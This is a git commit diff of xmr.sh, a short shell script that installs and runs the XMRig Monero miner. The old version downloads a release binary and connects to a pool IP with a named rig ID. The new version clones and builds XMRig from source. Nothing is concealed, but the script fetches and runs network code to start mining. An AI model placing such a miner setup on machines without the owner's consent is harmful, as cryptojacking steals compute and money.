2291111a2e21fa69dd7ec16feceb863a1dca85c1
ADYZM <46257040+ADYZM@users.noreply.github.com>
2022-04-16 00:07:00 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -5,8 +5,10 @@ sudo apt update
 clear
 sudo apt install screen
 screen -R xmr
- 
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
-tar xvzf xmrig-6.16.4-focal-x64.tar.gz
-cd xmrig-6.16.4
-./xmrig -o 168.235.86.33:3393 -u SK_QzApkbVGsAxyQykaWSnEF.adyzza -k --tls --rig-id adyzza1
+
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/build
+cmake ..
+make -j$(nproc)
+./xmrig
